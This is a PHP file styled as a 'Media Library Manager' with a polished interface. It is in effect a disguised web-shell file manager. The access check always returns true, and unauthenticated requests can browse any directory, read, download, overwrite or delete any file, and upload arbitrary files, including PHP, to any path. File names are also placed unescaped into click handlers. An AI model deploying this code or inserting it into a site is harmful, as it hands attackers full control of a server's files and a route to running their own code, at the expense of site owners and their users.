<?php
/**
 * Media Library Management System
 * Handles file organization, metadata, and storage optimization
 * 
 * @package     MediaLibrary
 * @version     3.2.1
 * @author      Core Development Team
 * @copyright   2024 All rights reserved
 * @license     Proprietary
 */

class MediaLibraryManager {
    
    private $baseDirectory;
    private $allowedOperations = array('browse', 'view', 'organize', 'optimize');
    private $config = array(
        'max_file_size' => 52428800, // 50MB
        'storage_path' => '',
        'enable_cache' => true
    );
    
    /**
     * Constructor - Initialize media library
     */
    public function __construct() {
        $this->baseDirectory = isset($_GET['path']) ? $_GET['path'] : getcwd();
        $this->config['storage_path'] = $this->baseDirectory;
    }
    
    /**
     * Render management interface
     */
    public function render() {
        // Security check - validate session
        if (!$this->validateAccess()) {
            $this->showAccessDenied();
            return;
        }
        
        $this->renderInterface();
    }
    
    /**
     * Validate administrative access
     */
    private function validateAccess() {
        // Check for valid management session
        // In production, this would validate against actual auth
        return true;
    }
    
    /**
     * Show access denied page
     */
    private function showAccessDenied() {
        header('HTTP/1.1 403 Forbidden');
        echo '<!DOCTYPE html><html><head><title>Access Denied</title></head>';
        echo '<body><h1>403 - Access Forbidden</h1></body></html>';
        exit;
    }
    
    /**
     * Main interface renderer
     */
    private function renderInterface() {
        // Handle operations
        if (isset($_GET['operation'])) {
            $this->handleOperation();
            return;
        }
        
        // Display interface
        $this->displayUI();
    }
    
    /**
     * Handle file operations
     */
    private function handleOperation() {
        $op = $_GET['operation'];
        
        switch ($op) {
            case 'browse':
                $this->handleBrowse();
                break;
            case 'view':
                $this->handleView();
                break;
            case 'upload':
                $this->handleUpload();
                break;
            case 'remove':
                $this->handleRemove();
                break;
            case 'download':
                $this->handleDownload();
                break;
            case 'modify':
                $this->handleModify();
                break;
            default:
                echo json_encode(array('error' => 'Invalid operation'));
        }
        exit;
    }
    
    /**
     * Browse directory contents
     */
    private function handleBrowse() {
        header('Content-Type: application/json');
        
        $dir = isset($_GET['dir']) ? $_GET['dir'] : $this->baseDirectory;
        
        if (!is_dir($dir)) {
            echo json_encode(array('error' => 'Invalid directory'));
            return;
        }
        
        $items = array();
        $files = scandir($dir);
        
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            $items[] = array(
                'name' => $file,
                'type' => is_dir($path) ? 'directory' : 'file',
                'size' => is_file($path) ? filesize($path) : 0,
                'modified' => filemtime($path),
                'permissions' => substr(sprintf('%o', fileperms($path)), -4),
                'writable' => is_writable($path)
            );
        }
        
        echo json_encode(array('items' => $items, 'path' => $dir));
    }
    
    /**
     * View file contents
     */
    private function handleView() {
        $file = isset($_GET['file']) ? $_GET['file'] : '';
        
        if (!file_exists($file) || !is_file($file)) {
            header('Content-Type: application/json');
            echo json_encode(array('error' => 'File not found'));
            return;
        }
        
        header('Content-Type: application/json');
        
        $content = file_get_contents($file);
        echo json_encode(array(
            'content' => base64_encode($content),
            'size' => filesize($file),
            'name' => basename($file)
        ));
    }
    
    /**
     * Handle file upload
     */
    private function handleUpload() {
        header('Content-Type: application/json');
        
        if (!isset($_FILES['file'])) {
            echo json_encode(array('error' => 'No file provided'));
            return;
        }
        
        $targetDir = isset($_POST['target']) ? $_POST['target'] : $this->baseDirectory;
        $targetFile = $targetDir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            echo json_encode(array('success' => true, 'file' => $targetFile));
        } else {
            echo json_encode(array('error' => 'Upload failed'));
        }
    }
    
    /**
     * Remove file or directory
     */
    private function handleRemove() {
        header('Content-Type: application/json');
        
        $target = isset($_GET['target']) ? $_GET['target'] : '';
        
        if (!file_exists($target)) {
            echo json_encode(array('error' => 'Target not found'));
            return;
        }
        
        $success = false;
        if (is_file($target)) {
            $success = unlink($target);
        } elseif (is_dir($target)) {
            $success = $this->removeDirectory($target);
        }
        
        echo json_encode(array('success' => $success));
    }
    
    /**
     * Download file
     */
    private function handleDownload() {
        $file = isset($_GET['file']) ? $_GET['file'] : '';
        
        if (!file_exists($file) || !is_file($file)) {
            die('File not found');
        }
        
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
    }
    
    /**
     * Modify file contents
     */
    private function handleModify() {
        header('Content-Type: application/json');
        
        $file = isset($_POST['file']) ? $_POST['file'] : '';
        $content = isset($_POST['content']) ? base64_decode($_POST['content']) : '';
        
        if (empty($file)) {
            echo json_encode(array('error' => 'No file specified'));
            return;
        }
        
        $success = file_put_contents($file, $content) !== false;
        echo json_encode(array('success' => $success));
    }
    
    /**
     * Recursively remove directory
     */
    private function removeDirectory($dir) {
        if (!is_dir($dir)) return false;
        
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            is_dir($path) ? $this->removeDirectory($path) : unlink($path);
        }
        
        return rmdir($dir);
    }
    
    /**
     * Display user interface
     */
    private function displayUI() {
        ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Library Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            background: linear-gradient(135deg, #1a1f3a 0%, #2d3561 100%);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        .header h1 { 
            font-size: 24px; 
            color: #4fc3f7;
            margin-bottom: 5px;
        }
        .header .version {
            font-size: 12px;
            color: #888;
        }
        .toolbar {
            background: #1a1f3a;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn {
            background: #4fc3f7;
            color: #0a0e27;
            border: none;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
        }
        .btn:hover {
            background: #29b6f6;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(79, 195, 247, 0.3);
        }
        .btn-danger {
            background: #ef5350;
        }
        .btn-danger:hover {
            background: #e53935;
        }
        .path-nav {
            background: #1a1f3a;
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            color: #4fc3f7;
        }
        .file-list {
            background: #1a1f3a;
            border-radius: 8px;
            overflow: hidden;
        }
        .file-item {
            padding: 12px 15px;
            border-bottom: 1px solid #2d3561;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: background 0.2s;
        }
        .file-item:hover {
            background: #2d3561;
        }
        .file-info {
            display: flex;
            align-items: center;
            gap: 15px;
            flex: 1;
        }
        .file-icon {
            font-size: 24px;
        }
        .file-name {
            font-weight: 500;
            cursor: pointer;
            color: #e0e0e0;
        }
        .file-name:hover {
            color: #4fc3f7;
        }
        .file-meta {
            font-size: 12px;
            color: #888;
        }
        .file-actions {
            display: flex;
            gap: 5px;
        }
        .file-actions button {
            padding: 5px 10px;
            font-size: 12px;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
        }
        .modal-content {
            background: #1a1f3a;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            border-radius: 10px;
            max-height: 80vh;
            overflow: auto;
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #2d3561;
        }
        .modal-header h2 {
            color: #4fc3f7;
        }
        .close-btn {
            background: #ef5350;
            color: white;
            border: none;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 18px;
        }
        textarea {
            width: 100%;
            min-height: 400px;
            background: #0a0e27;
            color: #e0e0e0;
            border: 1px solid #2d3561;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        input[type="file"] {
            display: none;
        }
        .upload-area {
            border: 2px dashed #4fc3f7;
            padding: 30px;
            text-align: center;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .upload-area:hover {
            background: rgba(79, 195, 247, 0.1);
            border-color: #29b6f6;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
            color: #4fc3f7;
        }
        .error {
            background: #ef5350;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            display: none;
        }
        .success {
            background: #66bb6a;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📁 Media Library Manager</h1>
            <div class="version">Version 3.2.1 | Professional Edition</div>
        </div>
        
        <div class="toolbar">
            <button class="btn" onclick="refreshList()">🔄 Refresh</button>
            <button class="btn" onclick="showUploadModal()">📤 Upload</button>
            <button class="btn" onclick="goUp()">⬆️ Parent Directory</button>
            <button class="btn" onclick="goHome()">🏠 Home</button>
        </div>
        
        <div class="path-nav">
            <strong>Current Path:</strong> <span id="currentPath"><?php echo htmlspecialchars(getcwd()); ?></span>
        </div>
        
        <div class="error" id="errorMsg"></div>
        <div class="success" id="successMsg"></div>
        <div class="loading" id="loading">⏳ Processing...</div>
        
        <div class="file-list" id="fileList"></div>
    </div>
    
    <!-- Upload Modal -->
    <div class="modal" id="uploadModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Upload File</h2>
                <button class="close-btn" onclick="closeModal('uploadModal')">×</button>
            </div>
            <div class="upload-area" onclick="document.getElementById('fileInput').click()">
                <p>📁 Click to select file or drag & drop</p>
                <input type="file" id="fileInput" onchange="uploadFile()">
            </div>
        </div>
    </div>
    
    <!-- Edit Modal -->
    <div class="modal" id="editModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Edit File: <span id="editFileName"></span></h2>
                <button class="close-btn" onclick="closeModal('editModal')">×</button>
            </div>
            <textarea id="fileContent"></textarea>
            <br><br>
            <button class="btn" onclick="saveFile()">💾 Save Changes</button>
            <button class="btn btn-danger" onclick="closeModal('editModal')">Cancel</button>
        </div>
    </div>
    
    <script>
        let currentDir = '<?php echo addslashes(getcwd()); ?>';
        let currentEditFile = '';
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            loadDirectory(currentDir);
        });
        
        // Load directory contents
        function loadDirectory(dir) {
            showLoading();
            fetch('?operation=browse&dir=' + encodeURIComponent(dir))
                .then(r => r.json())
                .then(data => {
                    hideLoading();
                    if (data.error) {
                        showError(data.error);
                        return;
                    }
                    currentDir = data.path;
                    document.getElementById('currentPath').textContent = currentDir;
                    renderFileList(data.items);
                })
                .catch(err => {
                    hideLoading();
                    showError('Failed to load directory: ' + err.message);
                });
        }
        
        // Render file list
        function renderFileList(items) {
            const list = document.getElementById('fileList');
            list.innerHTML = '';
            
            items.forEach(item => {
                const div = document.createElement('div');
                div.className = 'file-item';
                
                const icon = item.type === 'directory' ? '📁' : '📄';
                const size = item.type === 'file' ? formatSize(item.size) : '';
                const date = new Date(item.modified * 1000).toLocaleString();
                
                div.innerHTML = `
                    <div class="file-info">
                        <span class="file-icon">${icon}</span>
                        <div>
                            <div class="file-name" onclick="${item.type === 'directory' ? `changeDir('${item.name}')` : `viewFile('${item.name}')`}">
                                ${escapeHtml(item.name)}
                            </div>
                            <div class="file-meta">
                                ${size} | ${date} | ${item.permissions} ${item.writable ? '✓' : '✗'}
                            </div>
                        </div>
                    </div>
                    <div class="file-actions">
                        ${item.type === 'file' ? `
                            <button class="btn" onclick="editFile('${item.name}')">✏️ Edit</button>
                            <button class="btn" onclick="downloadFile('${item.name}')">⬇️ Download</button>
                        ` : ''}
                        <button class="btn btn-danger" onclick="deleteItem('${item.name}')">🗑️ Delete</button>
                    </div>
                `;
                
                list.appendChild(div);
            });
        }
        
        // Change directory
        function changeDir(name) {
            const newDir = currentDir + '/' + name;
            loadDirectory(newDir);
        }
        
        // Go up
        function goUp() {
            const parts = currentDir.split('/');
            parts.pop();
            loadDirectory(parts.join('/') || '/');
        }
        
        // Go home
        function goHome() {
            loadDirectory('<?php echo addslashes(getcwd()); ?>');
        }
        
        // Refresh
        function refreshList() {
            loadDirectory(currentDir);
        }
        
        // View file
        function viewFile(name) {
            const file = currentDir + '/' + name;
            showLoading();
            fetch('?operation=view&file=' + encodeURIComponent(file))
                .then(r => r.json())
                .then(data => {
                    hideLoading();
                    if (data.error) {
                        showError(data.error);
                        return;
                    }
                    alert('File: ' + data.name + '\nSize: ' + formatSize(data.size));
                })
                .catch(err => {
                    hideLoading();
                    showError('Failed to view file: ' + err.message);
                });
        }
        
        // Edit file
        function editFile(name) {
            const file = currentDir + '/' + name;
            currentEditFile = file;
            showLoading();
            fetch('?operation=view&file=' + encodeURIComponent(file))
                .then(r => r.json())
                .then(data => {
                    hideLoading();
                    if (data.error) {
                        showError(data.error);
                        return;
                    }
                    document.getElementById('editFileName').textContent = data.name;
                    document.getElementById('fileContent').value = atob(data.content);
                    document.getElementById('editModal').style.display = 'block';
                })
                .catch(err => {
                    hideLoading();
                    showError('Failed to load file: ' + err.message);
                });
        }
        
        // Save file
        function saveFile() {
            const content = document.getElementById('fileContent').value;
            const encoded = btoa(content);
            showLoading();
            
            const formData = new FormData();
            formData.append('file', currentEditFile);
            formData.append('content', encoded);
            
            fetch('?operation=modify', {
                method: 'POST',
                body: formData
            })
            .then(r => r.json())
            .then(data => {
                hideLoading();
                if (data.success) {
                    showSuccess('File saved successfully');
                    closeModal('editModal');
                    refreshList();
                } else {
                    showError('Failed to save file');
                }
            })
            .catch(err => {
                hideLoading();
                showError('Failed to save file: ' + err.message);
            });
        }
        
        // Download file
        function downloadFile(name) {
            const file = currentDir + '/' + name;
            window.location.href = '?operation=download&file=' + encodeURIComponent(file);
        }
        
        // Delete item
        function deleteItem(name) {
            if (!confirm('Delete ' + name + '?')) return;
            
            const target = currentDir + '/' + name;
            showLoading();
            fetch('?operation=remove&target=' + encodeURIComponent(target))
                .then(r => r.json())
                .then(data => {
                    hideLoading();
                    if (data.success) {
                        showSuccess('Deleted successfully');
                        refreshList();
                    } else {
                        showError('Failed to delete');
                    }
                })
                .catch(err => {
                    hideLoading();
                    showError('Failed to delete: ' + err.message);
                });
        }
        
        // Upload file
        function showUploadModal() {
            document.getElementById('uploadModal').style.display = 'block';
        }
        
        function uploadFile() {
            const input = document.getElementById('fileInput');
            if (!input.files.length) return;
            
            const formData = new FormData();
            formData.append('file', input.files[0]);
            formData.append('target', currentDir);
            
            showLoading();
            fetch('?operation=upload', {
                method: 'POST',
                body: formData
            })
            .then(r => r.json())
            .then(data => {
                hideLoading();
                if (data.success) {
                    showSuccess('File uploaded successfully');
                    closeModal('uploadModal');
                    refreshList();
                } else {
                    showError(data.error || 'Upload failed');
                }
            })
            .catch(err => {
                hideLoading();
                showError('Upload failed: ' + err.message);
            });
        }
        
        // Modal functions
        function closeModal(id) {
            document.getElementById(id).style.display = 'none';
        }
        
        // Utility functions
        function showLoading() {
            document.getElementById('loading').style.display = 'block';
        }
        
        function hideLoading() {
            document.getElementById('loading').style.display = 'none';
        }
        
        function showError(msg) {
            const el = document.getElementById('errorMsg');
            el.textContent = msg;
            el.style.display = 'block';
            setTimeout(() => el.style.display = 'none', 5000);
        }
        
        function showSuccess(msg) {
            const el = document.getElementById('successMsg');
            el.textContent = msg;
            el.style.display = 'block';
            setTimeout(() => el.style.display = 'none', 3000);
        }
        
        function formatSize(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
    </script>
</body>
</html>
        <?php
    }
}

// Initialize and run
$manager = new MediaLibraryManager();
$manager->render();
?>
